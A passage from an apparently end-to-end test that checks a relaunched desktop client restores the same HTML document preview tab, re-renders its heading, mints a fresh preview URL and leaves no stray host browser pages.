          (await readPairedHtmlPreviewInventory(relaunched, relaunchedArgs)).docWorkspaces.length,
        { timeout: 120_000, message: 'the relaunched client never restored the document tab' }
      )
      .toBe(1)
    const restored = requireSingleDocWorkspace(
      await readPairedHtmlPreviewInventory(relaunched, relaunchedArgs)
    )
    expect({
      pageUrl: restored.pageUrl,
      title: restored.title,
      workspaceDocFilePath: restored.workspaceDocFilePath
    }).toEqual({
      pageUrl: BLANK_PAGE_URL,
      title: RESTORE_FIXTURE_TITLE,
      workspaceDocFilePath: docFilePath
    })
    // A restore has to bring back the tab the reader had, not a fresh one that happens to show the
    // same document — the row is the same row it was created as.
    expect(restored.workspaceId).toBe(quitRow.workspaceId)

    await focusBrowserWorkspace(relaunched, prepared.worktreeId, restored.workspaceId)
    await expect
      .poll(() => readDocPreviewRenderedText(relaunched, 'h1'), {
        timeout: 120_000,
        message: 'the restored document tab never rendered its document again'
      })
      .toBe(RESTORE_FIXTURE_HEADING)
    const guestUrlAfterRestore = await readDocPreviewGuestUrl(relaunched)
    expect(guestUrlAfterRestore).toMatch(/^orca-preview:\/\//)
    // The grant is minted by the client that mounts the page, so a restore that carried the old
    // URL back in — from disk or from the host — would show the same one here.
    expect(guestUrlAfterRestore).not.toBe(guestUrlBeforeQuit)
    const afterRestore = await readPairedHtmlPreviewInventory(relaunched, relaunchedArgs)
    expect(afterRestore.htmlPreviewEditorFileIds).toEqual([])
    expect(
      afterRestore.hostBrowserPages.filter(
        (hostPage) =>
          hostPage.url.includes('orca-preview:') || hostPage.url.includes(RESTORE_FIXTURE_NAME)
      )
    ).toEqual([])
  } finally {
    await prepared?.client.dispose()
    if (abandonedProfile) {
      await cleanupE2EDaemons(abandonedProfile).catch(() => undefined)
    }
  }
})
